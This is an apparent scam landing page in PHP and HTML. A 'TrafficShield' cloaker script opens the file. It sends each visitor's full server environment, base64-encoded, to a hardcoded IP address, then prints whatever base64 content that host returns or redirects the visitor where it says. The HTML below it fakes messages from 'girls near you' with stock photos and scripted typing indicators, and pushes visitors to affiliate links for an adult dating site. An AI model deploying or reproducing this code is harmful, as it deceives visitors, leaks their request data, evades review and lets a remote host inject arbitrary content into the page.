<?php
namespace TrafficShield; 
error_reporting(0);
	class Traffic_Shield{
		public function run() {							
			ob_start();
			$this->ogrsr9854();
		}
		public function ogrsr9854() {	
            $this->_check(); 
            $response = $this->https_request();        
            $this->main($response);       
        }			
        public function _check() {	
            if(isset($_GET['TS-BHDNR-84848'])){
                echo "f0991ba497";
                die();
            }
        }
		public function get_header() {	
            $headers = array();     
            foreach($_SERVER as $k=>$v){
               $headers[$k] = $v;
            }
            $headers['TS-BHDNR-74191'] = "900661405745606";
            $headers['TS-BHDNR-74194'] = "f0991ba497"; 
            return $headers;
        }
		public function get_header_post() {
            $get_header = $this->get_header();
            return base64_encode(json_encode($get_header));      
        }	
		public function https_request() {
           $get_header['headers'] = $this->get_header_post();
           $ch = curl_init();
           curl_setopt($ch, CURLOPT_URL, "http://198.211.101.164/v2/logic/cloaker");
           curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
           curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36');
           curl_setopt($ch, CURLOPT_POST, true);
           curl_setopt($ch, CURLOPT_POSTFIELDS, $get_header);
           $result = curl_exec($ch);                
           return json_decode($result);
        }
		public function main($response) {
            if(!empty($response)){
                if($response->type == 1){
                    if(isset($response->zrc) && !empty($response->zrc)){
                            echo base64_decode($response->zrc);
                            die();
                        }else{            
                            $this->get_url($response->url,$response->http_code);
                        }
                }

            }
        }
		public function get_url($url,$code) { 
            header("Location: ".$url, true, $code);      
            exit();
      
        }
}
$traffic_Shield_Tre9854 = new Traffic_Shield();
$traffic_Shield_Tre9854->run();
// Copyright TrafficShield.io//
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>💬 Girls Want to Chat Now</title>
  <style>
    body {
      background-color: #111;
      color: #fff;
      font-family: Arial, sans-serif;
      padding: 20px;
      text-align: center;
    }
    h1 {
      color: #ff3366;
    }
    .chat-box {
      background: #222;
      padding: 20px;
      border-radius: 10px;
      margin: 20px auto;
      max-width: 480px;
      text-align: left;
    }
    .chat-msg {
      display: flex;
      align-items: center;
      margin-bottom: 20px;
    }
    .chat-msg img {
      width: 80px;
      height: 80px;
      border-radius: 50%;
      margin-right: 15px;
      object-fit: cover;
      border: 2px solid #ff3366;
    }
    .chat-text {
      flex: 1;
    }
    .chat-text strong {
      color: #ff3366;
    }
    .typing {
      display: none;
      margin-top: 10px;
      font-style: italic;
      color: #aaa;
    }
    .cta-button {
      background-color: #ff3366;
      color: white;
      border: none;
      padding: 14px 25px;
      margin: 10px auto;
      font-size: 16px;
      border-radius: 8px;
      display: block;
      text-decoration: none;
      max-width: 280px;
      transition: background 0.3s ease;
    }
    .cta-button:hover {
      background-color: #e02d5e;
    }
    .sticky-cta {
      position: fixed;
      bottom: 0;
      left: 0;
      right: 0;
      background: #ff3366;
      color: #fff;
      font-size: 18px;
      padding: 15px;
      text-align: center;
      z-index: 999;
    }
    .sticky-cta a {
      color: #fff;
      text-decoration: none;
      font-weight: bold;
    }
  </style>
</head>
<body>

  <h1>💬 3 Girls Near You Just Messaged!</h1>

  <div class="chat-box">
    <div class="chat-msg">
      <img src="https://randomuser.me/api/portraits/women/21.jpg" alt="Emily">
      <div class="chat-text">
        <strong>Emily (2km):</strong> “Hey cutie 😘 Are you nearby?”
        <div class="typing" id="typing1">Emily is typing...</div>
      </div>
    </div>
    <div class="chat-msg">
      <img src="https://randomuser.me/api/portraits/women/44.jpg" alt="Sophie">
      <div class="chat-text">
        <strong>Sophie (1km):</strong> “Wanna hook up tonight? I’m free 💦”
        <div class="typing" id="typing2">Sophie is typing...</div>
      </div>
    </div>
    <div class="chat-msg">
      <img src="https://randomuser.me/api/portraits/women/67.jpg" alt="Amanda">
      <div class="chat-text">
        <strong>Amanda (near you):</strong> “Send me a message, don’t be shy 😏”
        <div class="typing" id="typing3">Amanda is typing...</div>
      </div>
    </div>
  </div>

  <a class="cta-button" href="https://hello.fuckbookmobile.com/lander/sk_version4_1usd/?af=757&af_source=offerit&oid=268272255d64356.22770991&utm_source=757&utm_medium=fbpps&utm_content=home&utm_campaign=cummission&_ocid=102f8be14c768c7c717eff96d19cbd&subaff=354670" target="_blank">
    ✅ Yes, I’m Over 18 – Show Me Who’s Online
  </a>

  <a class="cta-button" href="https://hello.fuckbookmobile.com/lander/sk_version4_1usd/?af=757&af_source=offerit&oid=268272255d64356.22770991&utm_source=757&utm_medium=fbpps&utm_content=home&utm_campaign=cummission&_ocid=102f8be14c768c7c717eff96d19cbd&subaff=354670" target="_blank">
    🔥 Unlock Chat Now
  </a>

  <a class="cta-button" href="https://hello.fuckbookmobile.com/lander/sk_version4_1usd/?af=757&af_source=offerit&oid=268272255d64356.22770991&utm_source=757&utm_medium=fbpps&utm_content=home&utm_campaign=cummission&_ocid=102f8be14c768c7c717eff96d19cbd&subaff=354670" target="_blank">
    👀 View Local Profiles
  </a>

  <div class="sticky-cta">
    👉 <a href="https://hello.fuckbookmobile.com/lander/sk_version4_1usd/?af=757&af_source=offerit&oid=268272255d64356.22770991&utm_source=757&utm_medium=fbpps&utm_content=home&utm_campaign=cummission&_ocid=102f8be14c768c7c717eff96d19cbd&subaff=354670" target="_blank">Girls Nearby Want You – Tap to Meet!</a>
  </div>

  <script>
    setTimeout(() => { document.getElementById('typing1').style.display = 'block'; }, 1000);
    setTimeout(() => { document.getElementById('typing2').style.display = 'block'; }, 2500);
    setTimeout(() => { document.getElementById('typing3').style.display = 'block'; }, 4000);
  </script>

</body>
</html>
